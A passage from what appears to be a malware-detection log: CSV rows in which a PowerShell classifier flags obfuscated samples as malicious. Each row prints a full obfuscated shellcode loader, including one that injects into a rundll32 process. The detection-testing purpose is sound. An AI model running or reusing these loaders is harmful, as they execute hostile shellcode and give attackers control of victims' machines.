ext','x57,0x68,0x02,0xd9,0xc8,0x','0xcf,0x0d,0','0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0','0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0','c,0x49,0x8b,0x34,0x8b,0x01,0','97,0x6a,0x05,0x6','uint dwCreationFlags,','x0c','hreadId);[DllImport(oajmsvcrt.','0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b',', uint dwStackSize, IntPtr','5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,','0x','1,0x00,','8,0xc0,0xa8,0x01,0x94,','okS = B7Y[DllImport(oajkernel32.dlloaj)]pub','f','-Type -memberDefinition j1thokS -Name oajWin32oaj -namespace Win32Functions -passthru;[Byte[]','j1th','x02,0xd9,0xc8,0x5f,','lic','x44,0x24,0x24,0x5b,')).REPlAcE(([char]111+[char]97+[char]106),[sTrInG][char]34).REPlAcE(([char]106+[char]49+[char]116),'$').REPlAcE(([char]66+[char]55+[char]89),[sTrInG][char]39) | &amp; ( $SHELLID[1]+$ShelLiD[13]+'x')",malicious,TP
2026-07-13 16:57:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2250.ps1,custom-ps-ml,UNKNOWN,d597bc9e-5d69-4fa2-889a-ceeb1558c103,DESKTOP-BAC9DBQ,malicious,0.8669,RandomForest,2832,1533.67," iEX (((\""{42}{35}{46}{43}{39}{11}{8}{6}{47}{21}{14}{4}{41}{18}{34}{27}{37}{5}{22}{26}{44}{19}{23}{12}{2}{38}{31}{45}{29}{25}{15}{17}{36}{33}{1}{24}{13}{20}{28}{16}{48}{9}{10}{40}{32}{0}{3}{30}{7}\"" -f'tualAlloc(0,0x1000,WCdg,0x40);for (WCdi=0;W',',0xcc,0xfa,0x68,0xd0,0xbc,0xba,0xd8,0xb8,0xd6,0x34,0x06,0xd8,0xd8,0x9e,0x2f,0x72,0x37,0x77,0x07,0xea,0xae,0xd2,0xd3,0x8b,0x2f,0xc9,0x99,0',',0xc3,0xce,0xb8,0x3b,0x48,0xf1,0x6e,0xca,0x0a,0xd6,0xa','Cdi -le (WCdz.Length-1);WCdi++) {WCdw::memset([IntPtr](WCdx.ToInt32()+WCdi), WCdz[','d,0xa4,0xd4,0x26,0xd6,0x03','x3e,0x63,0x37,0x75,0xed','e RgnWin32Rgn -namespace Win32Fu','ep 60};',' -memberDefinition WCdc -Nam','x','4e,0xb3,0x74,0xab,0x5a,0xa7,0x25,0x3e,0x65,0x9e,0x9a,0','dw = Add-Type','9,0x82,0x3f','xbd,0xc1,0x2','0xc3,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x59,0x74,0xcf,0xa9,0x89,0xfa,0x30,0x52,0x49,0x9b,0xb9,0xb7,0x78,0x9b,0xde,0xbc,0x2a,0x2b,0x94,0x91,0xc6,0xc0,0xf8,0x01,0x5','xa5,0x68,0x7a,0x5d,0x22,0xc0,0xf3,0x7b,0xb5,0x2',',0x04,0xcd,0x40,0xcf,0x06,0x28,0xa6,','7,0x2e,0x3b,0x29,0xd6,0x','0x77,0x0b,0x6b,0x43,0xa4,0xeb,0x52,0x8c,0xb9,0xea,0x93,0xf1,0x30,0xbe,0x4c,0x7d,0xe6,0x2f,0xf9,0xc','0x3c,0xd0,0x28,0xa2,0xe6,0x93,0x8b,0x0e,0x17,0x77,0x4d,0xc4,','f,0x97,0xc2,0xff,0x5a,0x17,0x5','WCdz = 0xb8,0x5d,0x96,0x3a,0x55,0xdd,',',0x4','0x1b,0x3c,0x1','x8b,0xa4,0xfe,0x5e,0x45,0x4d,0x8a,0x4c,0x31,0','d6,0x5a,0xd5,0xe6,0','a,0xf8,0','x3b,0xdb,0xb1,0xda,0x3b,0x38','7','e,0x60,0x2d,0x66,0xf2,0x75,0x5c,0x25,0x9a,0xba,0x6d,0x','WCdi], 1)};WCdw::CreateThread(0,0,WCdx,0,0,0);for (;;){Start-sle','f,0x88,0xec,',',0x0d,0x1c,0xc5,0xde,0x91,0xdf,0x20,0xdf,0xee,0x09,0x0c,0x95,0x1e,0x8a;WCdg = 0x1000;if (WCdz.Length -gt 0x1000){WCdg = WCdz.Length};WCdx=WCdw::Vir','e,0x1c,0xa8,0xb4,0x10','b,0','llImport(Rgnkernel32.dllRgn)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Rgnkernel32.dllRgn)]public static extern IntPtr CreateThread(IntPtr lpT','d1,0x3c,0x63,0x1c,0x85,0x6c,0x1b,0xb5,0xa6,0xe6,0xdb,0x3a,0x73,0x92,0xde,0xac,0x27,0xd8,0x91,0x2f,0xb0,0x1c,0x52,0x3',',0x01,0xdc,0x6a,0xef,0x1a,0x87,0xac,0x11,0xcf,0xb3,0xe4,0x09,0x0c,0xf9,0xbf,0xa2,0xe6,0x75,0','a,0x97,0xc9,0x77,0xea,0x7d,0xb',' lpThreadId);[DllImport(Rgnmsvcrt.dllRgn)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);1lq;WC','xe9',',0x03,0x08,0xe7,0x38,','WCdc = 1lq[D','ess, IntPtr lpParameter, uint dwCreationFlags, IntPtr','x84,0xef,0x8b,0x3e,0x77,0x9a,0xe5,0x3d,0x0a,0x9d,0x31,','0xd','hreadAttributes, uint dwStackSize, IntPtr lpStartAddr','nctions -passthru;[Byte[]];[Byte[]]','0x50,0xf8,0x1f,0xbd,0x59,0x6c,0xe0,0xa9,0xa5,0x60,0xe0,0x29,0xf0,0xea,0xe0,0x41,0xa4,0')).REplaCe('1lq',[strinG][cHar]39).REplaCe('Rgn',[strinG][cHar]34).REplaCe('WCd',[strinG][cHar]36) )",malicious,TP
2026-07-13 16:57:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2264.ps1,custom-ps-ml,UNKNOWN,18fceccd-8c6c-430a-ae49-bdb882acad5a,DESKTOP-BAC9DBQ,malicious,0.7784,RandomForest,13704,1652.93," (((\""{101}{260}{206}{315}{155}{125}{23}{96}{19}{150}{219}{200}{205}{299}{256}{280}{282}{139}{88}{291}{211}{189}{309}{50}{63}{302}{67}{53}{180}{160}{82}{173}{311}{121}{225}{208}{11}{7}{123}{70}{98}{5}{235}{111}{142}{89}{271}{15}{153}{84}{165}{61}{87}{215}{231}{58}{276}{202}{47}{250}{90}{242}{300}{249}{177}{116}{169}{40}{79}{279}{297}{198}{319}{147}{66}{133}{304}{100}{44}{38}{228}{118}{72}{56}{314}{325}{148}{190}{204}{226}{59}{154}{257}{91}{201}{41}{151}{287}{245}{298}{313}{27}{324}{164}{264}{65}{162}{37}{170}{220}{184}{210}{320}{149}{217}{196}{146}{17}{29}{6}{290}{178}{152}{303}{0}{248}{159}{239}{124}{238}{273}{74}{229}{134}{258}{60}{107}{166}{255}{45}{99}{10}{214}{135}{230}{310}{261}{252}{34}{278}{241}{8}{145}{317}{176}{109}{244}{237}{39}{307}{284}{28}{55}{3}{132}{81}{97}{262}{195}{293}{301}{167}{288}{306}{137}{197}{247}{136}{51}{54}{95}{285}{105}{251}{94}{18}{216}{122}{183}{129}{221}{138}{240}{272}{141}{294}{227}{175}{223}{326}{31}{76}{102}{21}{64}{193}{289}{85}{266}{80}{57}{161}{25}{186}{117}{46}{16}{83}{1}{185}{259}{128}{212}{104}{233}{277}{144}{86}{20}{318}{140}{130}{4}{316}{113}{143}{171}{267}{78}{22}{275}{120}{35}{192}{305}{296}{179}{321}{2}{268}{9}{274}{209}{191}{312}{222}{77}{174}{112}{224}{30}{181}{157}{295}{253}{286}{188}{269}{92}{168}{265}{126}{75}{194}{199}{207}{203}{32}{131}{234}{33}{68}{12}{119}{270}{43}{73}{71}{163}{243}{158}{108}{292}{322}{13}{156}{114}{172}{323}{103}{283}{254}{26}{49}{218}{115}{36}{263}{48}{110}{327}{24}{69}{213}{106}{187}{14}{232}{93}{246}{281}{308}{182}{52}{62}{236}{42}{127}\""-f'exitThread',',0',',0x1f,0x56,0x68,0x75,0x46,0x9e,0x','nedArrayElemen','x58,0x58,0x58,0','Ptr GetModuleH','sWrittenPtr)  if ([Bool]!hRasuccess) { hRagloba','berOfBytesWritten);  [D','hread += hRabaseAddrLEbytes  hRacallRemoteThread += 0xFF','ff,0x57,0x57,0x57','ad += 0xFF,0xD0  h','s, byte[] lpBuffer, uint nSize, [Out] IntPtr lpNum',' -eq hRanull){  if ([Sy','-win Hidden  hRaid = (Get-Process -Name rundll32','  }  else {  S',' MemoryProtect','0xff,0xe0,0x5',' hRasc.Leng','Ra','  public enum MemoryPr','58,0x58,0x58,0x58,0x58,0x58,0','cf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,','1,0x51,0',',  Rese','ct -Re','6,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8','tbC:XGfWindowsXGfSystem32XGfrundll32.exed','lse { h','eThreadAddr = [System.Runtime.InteropServices.Marshal','th, hRabyte','0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x0','26,0x31,0xff,0x31','0x61,0x72,0x79,','8t select -expand id ','RacallRemoteThrea','b,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0',' Select-Obj','e -bOr [k32.func+Al',')  functi','hread','w-O',' ','  Inject-Shellcod','es','eParams, hRacode','0,0xB8  hRacallRemoteThread += hRaexitThreadAddrLEbytes  hRacal',',0x5b,0x5b,0x61,0x59,0x5a,0x51,','ThreadId);  [DllImport(dtbkernel32.dlldtb)]  public static extern bool CloseHandle(IntPtr hObject);  [DllImport(dtbkernel32.dlldtb)]  public static extern ',' -p','tb -ArgumentList dtbPrintui.dll PrintUIEntrydtb -win Hidden  hR','tic extern IntPtr VirtualAllocEx(IntPtr hProc','yElement(hRaOldProt','y id A8t select -expand id  hRaid =','ernel32.dlldtb)]  public s','ect,0)  hRasuc',']::UnsafeAddrOfPin','ndle) { hRaglobal:result = 2; return }  [Byte[]',',0xe2,0x58,0','2.dlldtb)]  public static extern IntPtr CreateThread(IntPtr lpThr','IsWow64Process(hRaprocHandle, h','bytes)  if ([Bool]hRawow64) {  [By','ntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, In',' Compar','ess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryPro','0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0','l','semblyRange)  hRa','Protect);  [DllImport(dtbk',' if (hRaordprocs','ferenceObj','ernel32.dlldtb)]  public sta','ntUIEntrydtb -win Hidden  hRaid = (Get-Process -','+ProcessAccessFlags]::All, 0, hRaid)  if ([Bool]!hRaprocHa','s -FilePath dtbC:XGfWindowsXGfSystem32XGfrundll32.exedtb -ArgumentList dtbPrintui.dll Pri','rLEbytes)  hRabaseAddrLEbytes = New-Object Byte[](4)  hRai=0  hRabaseAddr.ToString(d','3,0xe8,0x1d,0xff,0xff,0xff,',',0xc0,0xac,0x','0x68,0','0x5','bjec','xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75',' }  hRaremoteStubAddr = [k32.func]::VirtualAllocEx(hR','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  [DllImport(dtbkernel32.dlldtb)]  public static extern bool Write','8,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74','ublic static extern IntPtr','x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,','0x47,0x65,0x63,0x6b,0x6f,0x00,0x58,0x58,0x58,0x58,0x58,0x','tPtr lpParameter, uint dwCreat','lic static','ol VirtualProtect(IntPtr lpAddress, uint dw','t(IntPtr hHandle, Time','tr]::Size -eq 4',',0xff,0xd5,0x','ocess -FilePath dtbC:XGfWindowsXGfSysWOW64XGfrundll32.exedtb -ArgumentList dtbPrintui.dll PrintUIEntrydtb -win Hidden  ','cuteReadWrite, h','cess = [k32.func]::VirtualProtect(hRacallRemoteThreadA','rve = 0x2000  }  [Flags]','aprocHandl','tic extern Int','lRemoteThre','Provider.CompileAssemblyFromSource(hRacompil','function CleanInject {  hRacode = @dtb  using System;  using System.Runtime.Intero','3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0x','if ([Sys','0x64,0x6f,0x77,0x73,0x20,0x4e,0x5','moryProtection]:','procs -DifferenceObject hRardprocs -Pas','te[]] h','-Shellcode-Into-Remote-Proc hRaid  }  else {  Start-Process -F','acallRemoteThrea','roperty id A8','n IntPtr GetProcAddress(IntPtr hModule, strin','45,0x21,0x5e','0x57,0x57,0x57,0x57,0x','-Object -property id A8t ',' = (Get-Process -Name rundll32)A8t','oft.CSharp.CSharpCodeProvider  h','0,0x89,0x44,0x24,0x24',':OpenProcess([k32.func','stem.IntPtr]:','9,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xe','IntPtr hPr','Rasuccess = ','llImport(dtbk','Byte[]] hRaexitThreadAddrLEbytes = New-Object Byte[](4)','= 0x1000','75,0xe5,0x58,0xc','e-Into-Remote-Proc hRaid  }  }  }  CleanInject','0,0x2','ead, hRacallR','x58,0x58,0x58,0','0x2e,0x63,0x6f,0x6d,0x00  h','t(hRacallRemoteThread,0) ','compile',' [','RemoteThreadAddr ',':UnsafeAddrOfPinnedArra','dProtect = [System.Run','eThread.Length, hRabytesWrittenPtr)  if ','bkernel32.dlldtb)]  pub','0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0',' retur','g procName);  [DllImport(dtbkernel32.dlldtb)]  public static extern bo','51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x','0x57,0x36,0x34,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,',',0xD0,0x','ndle, hRabaseAddr, hRasc,','s.AddRange(hRaas','Proces','sWritten,0)  hRasuccess = [k32.func]::WriteProcess','otection  {  ExecuteReadWrite = 0x40,  ReadWri','return }  e','; retu','ion flNewProtect, [Out] IntPtr lpflOldProtect);  [DllImport(dtbkernel32.dlldtb)]  p','Rawow64Ptr)  if ',' [Flags]  public enum AllocationType  {  Commit ',')A8t Select','9,0xc7,0x75,0x0','-property id A8t select -expand id  Inject',' hRa','xtern IntPtr VirtualAlloc(Int','x8b,0x58,0x24,0x01,0xd3,0x6','locationType]::Reserv','Name rundll','1 }  hRabaseAddr = [k32.func]::VirtualAllocEx(hRaprocHandl',' CreateRemoteThread(IntPtr hProcess, I','RacallRemoteThread = 0xB8  hRacallRemoteThread += hRabaseAddrLEbytes  hRac',']!hRaremoteStubAddr) { hRaglobal:result = 3;','85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85','Ralocation = [PsObject].Assembly.Location  hRacompileParams = Ne','locationType]::Commit, [k32.func+MemoryProtection]::ExecuteR','00,0x5b,0x31,0xc9','select -expand id  Inject-Sh','ProcessMem','x','2,0x14,0x8b,0x72,0x28,0x0','00,0x48,0xC7,0xC0  hR','ros','lt = 4',',0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b','tatic e','0,0x2f,0x00,0x00,0x3',' -propert','[k32.func]::WriteProcessMemory(hRaprocHandle, hRaremoteStubAddr, hRacallRemoteThr',' i','x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07','b,0x01,0xd','sThru  Inject-Shellcode-Into-Remote-Proc hRaid','e5,0xf','tr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool b','sor Addres','xc0,0x74,0x48,0x31,0xff,0','x52,0x52','x01,0xd0,0x50','0x77,0x6f,0x6d,0','Protection]::ExecuteRead','rocHa','time.I','ms.Re','x65,0x6e,0x2d,0x66,0x','[Flags] ',')) { hRaglobal:result = 9;','uint dwCreationFlags, IntPtr lp','0x72,0x2d,0x68,0x69,0x6c,0x6c,','sWidth).AddressWidth -ne 32)  {  hRawow64Ptr = [System.Runtime.InteropServices.Marshal]',' publi','  public class ','6f,','ess, IntPtr lpBaseAddres','x7b,0xff,0xd5,0x85,0','f ([Bool]!hRabaseAddr) { hRaglobal:result = 3; return }  [Int[]] hRabytesWritten = 0  hRabytesWrittenPtr = [System','rn IntP','8,0x57,0x69,0x6e,','ect hRaord','Racall','ionFla','pOldProtect)  if ([Bool]!hRasuccess) { hRaglobal:result = 6; return }  h','Memory(hRap','ardprocs','te = 0x04  }  ','eadWrite) ','emot','0xe2,0x5d,0xff,0xd5,0x89,0xc1,','f,0xb7,0x4',',0x31,0xff,0xd5,','oc','::UnsafeAddrOfPinnedArrayElement(hRawow64,0)  hRatemp = [k32.func]::','lobal:result = 1  return  }  [Byte[]]hRasc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x5','on Inject-Shellcode-Into-Remote-Proc([Int] hRaid)  {  hRaprocHandle = [k32.func]:','tbX8dtb) -split Lb3([A-F0-9]{2})Lb3 A8t % { if (hRa_) {hRabaseAddrLEbytes[hRai] =','= [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElem','gs, IntPtr lpThreadId);  [DllImport(dtbkernel3','tart-Pr','4,0x20,0x36,0x2e,0x31,0x3b,0x20,0x57,0x4','Raordprocs = (Get-Process -name rundll32 -ErrorAction SilentlyContinue) A8t Select-Object -property id A','andle(string lpModuleName);  [DllImport(dtbkernel32.dlldtb)]  public static exter','e-Object -ReferenceObject hRaordprocs -DifferenceObject hRardprocs -PassThru','teT','  hRai=0  hRaexitThreadAddr.ToString(dtbX8dt','global:result = 5; return }  [','([Bool]!hRasuccess) { hRaglobal:result = 4; return }  [IntPtr] hRathreadHandle = [k32.func]::CreateRemoteThread(hRaprocHan','x48,0xC7,0xC0  hRacallRemoteT',' dwMilliseconds);  }','32)A8t Select-Object ','d += hRaexitThreadAddrLEbytes  hRacallRemo','!hRa','hRardprocs = (Get-Process -','nteropServices.Marshal]:','Addr) {','  dtb@  hRacodeProvider = New-Object Mic','int WaitForSingleObjec',':Exe','  [Byte[]] h','x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa','Process -FilePath d','allRemoteThread += 0xFF,0xD0,0x6A,0x0',' { Infinite = 0xFFFFFFFF }  [DllImport(dtbkernel32.dlldtb)]  public stat','([Bool]!hRawow64 -and ([IntP','System.Convert]::ToByte(hRa_,16); hRai++}}  [System.Array]::Reverse(hRabaseAddrLE',',0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x2','pServices;  namespace k32  {','moteThread,0)  } else {','e, 0, hRacallRemoteThread.Length, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+Memory','ect','e, 0, hRasc.Length + 1, [k32.func+A',',0xc0,0x','0xff,0x31,0',',','86,0xff,0xd5,0x31,0x','f,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2',':Size -eq 4) {  Start-Proc','Size,','dle, 0, 0, hRaremoteStubAddr, hRabaseAddr, 0, 0)  if ([Bool]!hRathreadHandle) { hRaglobal:result = 7; return }  hRasuccess = [k32.func]::CloseHandle(hRaprocHandle)  if ([Bool]!hRasuccess) { hRaglobal:result = 8;','b) -split Lb3([A-F0-9]{2})Lb3 A8t % { if (hRa_) {hRaexitThreadAddrLEbytes[hRai] = [System.Convert]::ToByte(hRa_,16); hRai++}}  [System.Array]::Reverse(hRaexitThreadAdd',',0x57,0x56,0x68,0x2d,0x06,0x18,0','x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x8','eadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ','f,','d = 0','t System.CodeDom.Compiler.CompilerParameters  hRaassemblyRange = @(dtbSystem.dlldtb, hRalocation','ic extern bool IsWow64Process(IntPtr hProcess, [Out] IntPtr Wow','N','64Process);  [DllImport(dt','tem.IntPtr]::Size -eq 4) {  Start-','0xFF,0xD0  hRacallRemot','ddr, hRacallRemoteThread.Length, [k32.func+Me','4,0x53,0x','lseif ([Bool]',' retur',',0x8b,0x48,0','l:resu',' exte','ilePath dtbC:XGfWindowsXGfSysWOW64XGfrundll32.exedtb','Write)  ','n }  hRag','4,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x51,0x63,0x70,0x67,0x00,0x00,0x68,0xf0,0xb5,0xa2,0','x52,0x51',')  hRacompilePara','wow64){ hRasc = hRasc64','c enum Time : uint ','  }','if ([Bool','tection fl','rn }  hRak32handle = [k32.func]::GetModuleHandle(dtbkernel32.dlldtb)  hRaexitThreadAddr = [k32.func]::GetProcAddress(hRak32handle, dtbExitThreaddtb)  if ([Bool]!hRa','Params.GenerateInMemory = hRaTrue  hRaoutput = hRacode',',0','n }  [Int[]] hRaOldProtect = 0  hRapOl',' += ','ame rundll32)A8t Select-Object','InheritHandle, uint dwProcessId);  [DllImport(dtbkernel32.dlldtb)]  public sta','ent(hRacallRe','ory(','x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,',' }  } e',']hRawow64 = 0xF','func  {  [Flags]  public enum ProcessAccessFlags : uint  {  All = 0x001F0FFF,  CreateThread = 0x00000002  } ','x00,0x59,0x31,0xff,','6A,0x','x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,','ferencedAssemblie','.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement(hRabyte',',0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a',' -ArgumentList dtbPrintui.dll PrintUIEntrydtb ','ellcode-Into-Remote-Proc hRaid  }  }  else {  ','Rawow64[0] = ','F  if ((Get-WmiObject Win32_','a,0x','t select -expand id  hRaid = Compare-Obje'))-ReplAce ([cHar]88+[cHar]71+[cHar]102),[cHar]92-creplaCE ([cHar]76+[cHar]98+[cHar]51),[cHar]39-creplaCE([cHar]100+[cHar]116+[cHar]98),[cHar]34 -ReplAce ([cHar]65+[cHar]56+[cHar]116),[cHar]124  -ReplAce  'hRa',[cHar]36) |&amp; ( $VERboSEprEFerenCe.Tostring()[1,3]+'X'-join'')",malicious,TP
2026-07-13 16:57:46,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2267.ps1,custom-ps-ml,UNKNOWN,ca489a31-d991-4ff3-a01d-a9142c3fc8c0,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3282,1584.83," &amp; ( $PshOmE[4]+$pShoMe[30]+'X')( ((\""{8}{2}{42}{30}{31}{53}{32}{28}{19}{7}{52}{54}{27}{21}{43}{18}{4}{37}{6}{41}{35}{39}{15}{34}{11}{49}{45}{14}{24}{25}{17}{13}{1}{22}{29}{5}{23}{38}{44}{0}{12}{10}{50}{48}{46}{51}{36}{26}{16}{3}{20}{47}{33}{9}{40}\"" -f',0xe5,0xe6,0x16,0x72,0x91,0x06,0xf7,0x72,0x61,0x51,0x9','x82,0xf8,0x',')]public static extern IntPtr Virtu','az.Length-1);Qdai++) {Qdaw::memset([IntPtr](QdabxqX.ToInt32()+Qdai), Qdaz[Qd','0xc3,0x56,0xdb,0xca,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x',',0x1d,0x31,0x4b,','x0f,0x03,0x57,0x75,0x8b,0x36,0xaa,0x6','lpParame','QdaVUZ3 = pyXQdaPo9 = pyXpyX[DllImport(G7bkernel32.dllG7b','Base64String([System.Text.Encoding]::Unicode.GetBytes(QdaVUZ3));QdaXWtl = G7b-enc G7b;if([IntPtr]::Size -eq 8){QdaRzs = Qdaenv:SystemRoot + G7bbplsyswow64bplWindowsPowerShellbplv1.0bplpowershellG7b;iex G7b&amp; QdaRzs QdaXWtl QdaeG7b}else{;iex G7b&amp; powershel','xfd,0xdf,0xdb,0x0c,0x52,0x77,0xb4,0xb2,0x8d,0xbf,0x1b,0x4c,0xf8,0x41,0x67,0x9b,0x','b,0xbf,0xcb,0xe8,0x0a,0x43,0x16,0x3d,0xed,0x7a','d,0x72,0x09,0x05,0xc5,0x20,0x2c,0x4a,0xd0,0x54,0','4,0xaf,0x3e,0xfe,0xed,0x15,0x90,0xff,0xee,0xf6,0x4d,0x5a,0x64,0x1a,0x99,0xd7,0x27,0x72,0x6e,0xda,0xd7,0','0xbc,0x14,0x42,0x6f,0x51,0x11,0x1e,0xac,0xda,0x69','x95,0x61,0x03,0x75,0xdb,0xad,0x24,0x3e,0x56,0x','40);for (Qdai=0;Qdai -le (Qd','0x84,0x57,0x94,0x75,0xbf,0x63,0x1d,0x78,0x10,0xe2,0x65,0x5f,0xb','b -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Qdaz = 0xba,0x7a,0x69,','e, IntPtr lpStartAddress, IntPtr ','ai], 1)};Qdaw::CreateThread(0,0,QdabxqX,0','tr dest, uint ','6d,0xab,0xb0,0xa7,0xc5,0x23,0xf8,0x20,0xc0,0xb4,0xff,0x1a,0xb4,0x2b,0xfe,0xa4,0xc5,0x62,0xc4,0xf1,0x95,0x1c,0xed,0x79,0x7e,0xdd,0x12,0xac,0xeb,0xd8,0x84,0x8f,0x44,0xe3,0x5e,0x78,0x97,0xe4,0x44,0xf','0x60,0x74,0',',0x8e,0xb4,0x3f,0x39,0x','b1,0x95,0x91,0x32,0xe8,0x35,0x13,0x97,0x80,0x7f,0x0b,0xf4,0xad,0x36,0xa0,0xce,0x5a,0xc9,0x60,0x1f,0xa2,0x66,0x4d,0x90,0x51,0x76,0x89,0x16,0x8a,0x0d,0xe3,0x65,0x37,0x16,0x30,0x14,0xe3,0x93,0xa3,0xbe,0x60,0x03,0x08,0x3f,0xa4,0xd2,0xdb,0x33,0x01,0x90,','(0,0x1000,Qdag,0x','IntP','ead(IntPtr lpThreadAttributes, uint dwStackSiz','d,0x1e,0x02,0x28,0xad,0x70,0x9b,0x88',' lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllI','mport','kernel32.dllG7b)]public static extern IntPtr CreateThr','p 60};pyX;Qdae = [System.Convert]::To','88,0x0','0x27,0xb2,0','Qdag = Qdaz.Length};QdabxqX=Qdaw::VirtualAlloc','57,0','xbe,0xb4,0x90,0x77,0x14,0xdd,0x','xf2,0xde,0x2c,0x96,0xfe,0','l QdaXWtl QdaeG7b;}','1,0xc9,0xb9,0x53,0x71,0xae,0x30,0xb6,0x40,0xee,','alAlloc(IntPtr','src, uint count);pyXpyX;Qdaw = Add-Type -memberDefinition QdaPo9 -Name G7bWin32G7','3a,0x98,0xc1,0xb5,0xd2,0x01,0x48,0x4d,0x43,0xcd,0x46,0x2b,0x43,0x45,0x65,0xcb,0x0d,0xae,0x00,0xdf,0xf9,0x5e,0x5f,0xbd,0xaf,0x61,0x75,0xa8,0x4f,0xf4,0x72,0x7b,0x18,0x60,0x79,0x5a,0x6e,0x2f,0x82,0x89','8,',' = 0x100',',0,0);for (;;){Start-slee','0x37,0x89,0x1f;Qdag',',0xd9,0x30,0xec,0xbb,0x04,0xb','c4,','0;if (Qdaz.Length -gt 0x1000){','ter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(G7bmsvcrt.dllG7b)]public stati','(G7b','c extern IntPtr memset(')).repLaCe('G7b',[strINg][ChAr]34).repLaCe('pyX',[strINg][ChAr]39).repLaCe(([ChAr]98+[ChAr]112+[ChAr]108),'\\').repLaCe('Qda','$') )",malicious,TP
